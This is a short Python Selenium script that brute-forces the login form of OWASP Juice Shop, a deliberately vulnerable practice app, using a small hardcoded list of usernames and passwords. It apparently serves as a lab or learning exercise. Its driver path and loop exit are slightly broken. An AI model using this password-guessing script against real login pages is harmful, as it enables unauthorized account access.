from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from time import sleep

# Path to ChromeDriver executable
driver_path = r"C:\Users\garci\Downloads\chrome-win64\chrome.exe"  # Update with your path to chromedriver

# Set up the WebDriver with Service
service = Service(driver_path)
driver = webdriver.Chrome(service=service)
driver.get("https://juice-shop.herokuapp.com/#/login")
sleep(3)  # Wait for page to load

# Usernames and passwords to try (simple brute-force list)
usernames = ["admin", "user"]
passwords = ["1234", "password", "admin"]

# Locate login form elements
for username in usernames:
    for password in passwords:
        # Enter username
        driver.find_element(By.ID, "email").clear()
        driver.find_element(By.ID, "email").send_keys(username)
        
        # Enter password
        driver.find_element(By.ID, "password").clear()
        driver.find_element(By.ID, "password").send_keys(password)
        
        # Submit the form
        driver.find_element(By.ID, "password").send_keys(Keys.RETURN)
        
        # Pause and check if login succeeded
        sleep(2)
        
        # Check for successful login indicator (modify according to actual page response)
        if "Welcome" in driver.page_source:
            print(f"Login successful with Username: {username} and Password: {password}")
            break

# Close the driver
driver.quit()
